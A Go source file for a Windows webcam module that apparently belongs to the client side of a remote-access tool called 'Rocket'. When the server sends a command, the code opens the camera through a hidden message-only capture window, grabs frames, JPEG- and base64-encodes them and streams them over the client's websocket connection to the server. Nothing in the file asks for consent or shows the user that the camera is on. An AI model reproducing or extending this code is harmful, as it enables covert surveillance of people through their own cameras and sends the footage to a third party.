//go:build windows && !webcam_stub
// +build windows,!webcam_stub

package webcam

import (
	"Rocket/client/common"
	"Rocket/modules"
	"bytes"
	"encoding/base64"
	"errors"
	"fmt"
	"image"
	"image/jpeg"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"
)

var (
	errNotInitialized = errors.New("webcam not initialized")
	errAlreadyRunning = errors.New("webcam already running")
	errNoDevices      = errors.New("no webcam devices found")
)

// Windows API constants
const (
	WM_CAP_START                = 0x0400
	WM_CAP_DRIVER_CONNECT       = WM_CAP_START + 10
	WM_CAP_DRIVER_DISCONNECT    = WM_CAP_START + 11
	WM_CAP_DRIVER_GET_NAME      = WM_CAP_START + 12
	WM_CAP_SET_PREVIEW          = WM_CAP_START + 50
	WM_CAP_SET_PREVIEWRATE      = WM_CAP_START + 52
	WM_CAP_SET_SCALE            = WM_CAP_START + 53
	WM_CAP_GRAB_FRAME           = WM_CAP_START + 60
	WM_CAP_GRAB_FRAME_NOSTOP    = WM_CAP_START + 61
	WM_CAP_SET_CALLBACK_FRAME   = WM_CAP_START + 5
	WM_CAP_GET_VIDEOFORMAT      = WM_CAP_START + 44
	WM_CAP_SET_VIDEOFORMAT      = WM_CAP_START + 45
	WM_CAP_DLG_VIDEOFORMAT      = WM_CAP_START + 41
	WM_CAP_DLG_VIDEOSOURCE      = WM_CAP_START + 42

	WS_CHILD        = 0x40000000
	WS_VISIBLE      = 0x10000000
	HWND_MESSAGE    = ^uintptr(2)
)

// BITMAPINFOHEADER structure
type BITMAPINFOHEADER struct {
	BiSize          uint32
	BiWidth         int32
	BiHeight        int32
	BiPlanes        uint16
	BiBitCount      uint16
	BiCompression   uint32
	BiSizeImage     uint32
	BiXPelsPerMeter int32
	BiYPelsPerMeter int32
	BiClrUsed       uint32
	BiClrImportant  uint32
}

// VIDEOHDR structure for frame callback
type VIDEOHDR struct {
	LpData          uintptr
	DwBufferLength  uint32
	DwBytesUsed     uint32
	DwTimeCaptured  uint32
	DwUser          uintptr
	DwFlags         uint32
	DwReserved      [4]uintptr
}

var (
	avicap32         = syscall.NewLazyDLL("avicap32.dll")
	user32           = syscall.NewLazyDLL("user32.dll")
	gdi32            = syscall.NewLazyDLL("gdi32.dll")

	procCapCreateCaptureWindowW = avicap32.NewProc("capCreateCaptureWindowW")
	procCapGetDriverDescriptionW = avicap32.NewProc("capGetDriverDescriptionW")

	procSendMessageW      = user32.NewProc("SendMessageW")
	procDestroyWindow     = user32.NewProc("DestroyWindow")
	procGetDC             = user32.NewProc("GetDC")
	procReleaseDC         = user32.NewProc("ReleaseDC")
	procCreateCompatibleDC = gdi32.NewProc("CreateCompatibleDC")
	procDeleteDC          = gdi32.NewProc("DeleteDC")
	procCreateDIBSection  = gdi32.NewProc("CreateDIBSection")
	procDeleteObject      = gdi32.NewProc("DeleteObject")
	procSelectObject      = gdi32.NewProc("SelectObject")
	procBitBlt            = gdi32.NewProc("BitBlt")
)

// WebcamSession represents an active webcam streaming session
type WebcamSession struct {
	uuid       string
	deviceID   int
	hwnd       uintptr
	frameData  chan []byte
	stop       chan struct{}
	senderStop chan struct{}
	mu         sync.Mutex
	running    bool
	width      int
	height     int
	fps        int

	// Statistics
	seqNumber  uint32
	framesSent uint64
	bytesSent  uint64
	errors     uint64
}

var (
	webcamSession *WebcamSession
	webcamMutex   sync.Mutex
)

// ListDevices returns a list of available webcam devices
func ListDevices() ([]string, error) {
	var deviceList []string

	nameBuffer := make([]uint16, 256)
	verBuffer := make([]uint16, 256)

	for i := 0; i < 10; i++ {
		ret, _, _ := procCapGetDriverDescriptionW.Call(
			uintptr(i),
			uintptr(unsafe.Pointer(&nameBuffer[0])),
			uintptr(len(nameBuffer)),
			uintptr(unsafe.Pointer(&verBuffer[0])),
			uintptr(len(verBuffer)),
		)

		if ret != 0 {
			name := syscall.UTF16ToString(nameBuffer)
			version := syscall.UTF16ToString(verBuffer)
			if name != "" {
				deviceList = append(deviceList, fmt.Sprintf("%d: %s (%s)", i, name, version))
			}
		}
	}

	if len(deviceList) == 0 {
		return nil, errNoDevices
	}

	return deviceList, nil
}

// InitWebcam initializes a new webcam streaming session
func InitWebcam(pack modules.Packet) error {
	webcamMutex.Lock()
	defer webcamMutex.Unlock()

	if webcamSession != nil && webcamSession.running {
		return errAlreadyRunning
	}

	webcamUUID, ok := pack.Data[`webcam`].(string)
	if !ok {
		return errors.New("missing webcam UUID in packet")
	}

	session := &WebcamSession{
		uuid:       webcamUUID,
		frameData:  make(chan []byte, 30),
		stop:       make(chan struct{}),
		senderStop: make(chan struct{}),
		width:      640,
		height:     480,
		fps:        15,
	}

	webcamSession = session
	fmt.Printf("[INFO] Webcam session initialized: %s\n", webcamUUID)
	return nil
}

// HandleSelect handles webcam device selection and starts streaming
func HandleSelect(pack modules.Packet) error {
	webcamMutex.Lock()
	defer webcamMutex.Unlock()

	if webcamSession == nil {
		return errNotInitialized
	}

	var deviceID int
	switch v := pack.Data[`device`].(type) {
	case float64:
		deviceID = int(v)
	case string:
		if _, err := fmt.Sscanf(v, "%d:", &deviceID); err != nil {
			return fmt.Errorf("invalid device ID format: %w", err)
		}
	default:
		return errors.New("missing or invalid device ID")
	}

	if resolution, ok := pack.Data[`resolution`].(map[string]any); ok {
		if w, ok := resolution[`width`].(float64); ok {
			webcamSession.width = int(w)
		}
		if h, ok := resolution[`height`].(float64); ok {
			webcamSession.height = int(h)
		}
	}

	if fps, ok := pack.Data[`fps`].(float64); ok {
		webcamSession.fps = int(fps)
	}

	webcamSession.deviceID = deviceID

	// Create capture window
	windowName, _ := syscall.UTF16PtrFromString("WebcamCapture")
	hwnd, _, err := procCapCreateCaptureWindowW.Call(
		uintptr(unsafe.Pointer(windowName)),
		uintptr(WS_CHILD),
		0, 0,
		uintptr(webcamSession.width),
		uintptr(webcamSession.height),
		HWND_MESSAGE,
		0,
	)

	if hwnd == 0 {
		return fmt.Errorf("failed to create capture window: %v", err)
	}
	webcamSession.hwnd = hwnd

	// Connect to driver
	ret, _, _ := procSendMessageW.Call(hwnd, WM_CAP_DRIVER_CONNECT, uintptr(deviceID), 0)
	if ret == 0 {
		procDestroyWindow.Call(hwnd)
		return fmt.Errorf("failed to connect to webcam device %d", deviceID)
	}

	// Set preview rate
	frameInterval := 1000 / webcamSession.fps
	procSendMessageW.Call(hwnd, WM_CAP_SET_PREVIEWRATE, uintptr(frameInterval), 0)

	// Start capture goroutine
	go captureLoop(webcamSession)

	// Start packet sender
	go webcamPacketSender(webcamSession)

	webcamSession.running = true
	fmt.Printf("[INFO] Webcam capture started: device %d (%dx%d @%dfps)\n",
		deviceID, webcamSession.width, webcamSession.height, webcamSession.fps)
	return nil
}

// captureLoop continuously captures frames from webcam
func captureLoop(session *WebcamSession) {
	defer func() {
		fmt.Printf("[INFO] Webcam capture loop stopped\n")
	}()

	frameDuration := time.Second / time.Duration(session.fps)
	ticker := time.NewTicker(frameDuration)
	defer ticker.Stop()

	for {
		select {
		case <-session.stop:
			return
		case <-ticker.C:
			frame, err := grabFrame(session)
			if err != nil {
				atomic.AddUint64(&session.errors, 1)
				continue
			}

			select {
			case session.frameData <- frame:
			default:
				// Channel full, drop frame
			}
		}
	}
}

// grabFrame captures a single frame from the webcam
func grabFrame(session *WebcamSession) ([]byte, error) {
	session.mu.Lock()
	defer session.mu.Unlock()

	if session.hwnd == 0 {
		return nil, errors.New("capture window not initialized")
	}

	// Grab frame
	ret, _, _ := procSendMessageW.Call(session.hwnd, WM_CAP_GRAB_FRAME_NOSTOP, 0, 0)
	if ret == 0 {
		return nil, errors.New("failed to grab frame")
	}

	// Get DC from capture window
	hdcSrc, _, _ := procGetDC.Call(session.hwnd)
	if hdcSrc == 0 {
		return nil, errors.New("failed to get source DC")
	}
	defer procReleaseDC.Call(session.hwnd, hdcSrc)

	// Create compatible DC
	hdcDest, _, _ := procCreateCompatibleDC.Call(hdcSrc)
	if hdcDest == 0 {
		return nil, errors.New("failed to create compatible DC")
	}
	defer procDeleteDC.Call(hdcDest)

	// Create DIB section for raw pixel access
	var bmpInfo struct {
		BmiHeader BITMAPINFOHEADER
		BmiColors [3]uint32
	}
	bmpInfo.BmiHeader.BiSize = uint32(unsafe.Sizeof(bmpInfo.BmiHeader))
	bmpInfo.BmiHeader.BiWidth = int32(session.width)
	bmpInfo.BmiHeader.BiHeight = -int32(session.height) // Negative for top-down DIB
	bmpInfo.BmiHeader.BiPlanes = 1
	bmpInfo.BmiHeader.BiBitCount = 24
	bmpInfo.BmiHeader.BiCompression = 0 // BI_RGB

	var bits unsafe.Pointer
	hBitmap, _, _ := procCreateDIBSection.Call(
		hdcDest,
		uintptr(unsafe.Pointer(&bmpInfo)),
		0, // DIB_RGB_COLORS
		uintptr(unsafe.Pointer(&bits)),
		0,
		0,
	)
	if hBitmap == 0 {
		return nil, errors.New("failed to create DIB section")
	}
	defer procDeleteObject.Call(hBitmap)

	// Select bitmap into DC
	oldBitmap, _, _ := procSelectObject.Call(hdcDest, hBitmap)
	defer procSelectObject.Call(hdcDest, oldBitmap)

	// BitBlt from source to destination
	ret, _, _ = procBitBlt.Call(
		hdcDest,
		0, 0,
		uintptr(session.width),
		uintptr(session.height),
		hdcSrc,
		0, 0,
		0x00CC0020, // SRCCOPY
	)
	if ret == 0 {
		return nil, errors.New("BitBlt failed")
	}

	// Convert raw BGR pixels to image
	stride := ((session.width*3 + 3) / 4) * 4 // DWORD aligned
	pixelSize := stride * session.height

	pixelData := make([]byte, pixelSize)
	if bits != nil {
		// Copy pixel data
		for i := 0; i < pixelSize; i++ {
			pixelData[i] = *(*byte)(unsafe.Pointer(uintptr(bits) + uintptr(i)))
		}
	}

	// Create image from BGR data
	img := image.NewRGBA(image.Rect(0, 0, session.width, session.height))
	for y := 0; y < session.height; y++ {
		for x := 0; x < session.width; x++ {
			srcIdx := y*stride + x*3
			if srcIdx+2 < len(pixelData) {
				dstIdx := img.PixOffset(x, y)
				// BGR to RGB
				img.Pix[dstIdx] = pixelData[srcIdx+2]   // R
				img.Pix[dstIdx+1] = pixelData[srcIdx+1] // G
				img.Pix[dstIdx+2] = pixelData[srcIdx]   // B
				img.Pix[dstIdx+3] = 255                  // A
			}
		}
	}

	// Encode to JPEG
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 70}); err != nil {
		return nil, fmt.Errorf("JPEG encode failed: %w", err)
	}

	return buf.Bytes(), nil
}

// webcamPacketSender reads encoded frames from channel and sends packets to server
func webcamPacketSender(session *WebcamSession) {
	defer fmt.Printf("[INFO] Webcam packet sender stopped\n")

	for {
		select {
		case <-session.senderStop:
			return
		case frameData, ok := <-session.frameData:
			if !ok {
				return
			}

			common.Mutex.RLock()
			conn := common.WSConn
			common.Mutex.RUnlock()

			if conn == nil {
				atomic.AddUint64(&session.errors, 1)
				continue
			}

			seq := atomic.AddUint32(&session.seqNumber, 1)

			packet := modules.Packet{
				Act: "WEBCAM_DATA",
				Data: map[string]any{
					"uuid":      session.uuid,
					"data":      base64.StdEncoding.EncodeToString(frameData),
					"seq":       seq,
					"timestamp": time.Now().UnixMilli(),
					"size":      len(frameData),
					"width":     session.width,
					"height":    session.height,
				},
			}

			if err := conn.SendPack(packet); err != nil {
				atomic.AddUint64(&session.errors, 1)
				fmt.Printf("[ERROR] Failed to send webcam packet: %v\n", err)
			} else {
				atomic.AddUint64(&session.framesSent, 1)
				atomic.AddUint64(&session.bytesSent, uint64(len(frameData)))
			}
		}
	}
}

// PingWebcam handles keep-alive ping
func PingWebcam(pack modules.Packet) {
	// No action needed
}

// KillWebcam stops the webcam streaming session
func KillWebcam(pack modules.Packet) {
	webcamMutex.Lock()
	defer webcamMutex.Unlock()

	if webcamSession == nil {
		return
	}

	webcamSession.mu.Lock()
	wasRunning := webcamSession.running
	if webcamSession.running {
		close(webcamSession.stop)
		close(webcamSession.senderStop)
		webcamSession.running = false
	}
	webcamSession.mu.Unlock()

	if wasRunning {
		time.Sleep(100 * time.Millisecond)
	}

	// Print statistics
	frames := atomic.LoadUint64(&webcamSession.framesSent)
	bytesCount := atomic.LoadUint64(&webcamSession.bytesSent)
	errCount := atomic.LoadUint64(&webcamSession.errors)
	fmt.Printf("[INFO] Webcam session statistics - Frames: %d, Bytes: %d, Errors: %d\n",
		frames, bytesCount, errCount)

	// Cleanup
	if webcamSession.hwnd != 0 {
		procSendMessageW.Call(webcamSession.hwnd, WM_CAP_DRIVER_DISCONNECT, 0, 0)
		procDestroyWindow.Call(webcamSession.hwnd)
		webcamSession.hwnd = 0
	}

	if webcamSession.frameData != nil {
		close(webcamSession.frameData)
	}

	webcamSession = nil
	fmt.Printf("[INFO] Webcam session killed\n")
}

// GetFrameData returns the channel for reading encoded frames
func GetFrameData() <-chan []byte {
	webcamMutex.Lock()
	defer webcamMutex.Unlock()

	if webcamSession == nil {
		return nil
	}
	return webcamSession.frameData
}

// GetSessionUUID returns the current webcam session UUID
func GetSessionUUID() string {
	webcamMutex.Lock()
	defer webcamMutex.Unlock()

	if webcamSession == nil {
		return ""
	}
	return webcamSession.uuid
}

// IsRunning returns whether webcam is currently streaming
func IsRunning() bool {
	webcamMutex.Lock()
	defer webcamMutex.Unlock()

	return webcamSession != nil && webcamSession.running
}

// Cleanup cleans up webcam resources on shutdown
func Cleanup() {
	KillWebcam(modules.Packet{})
}
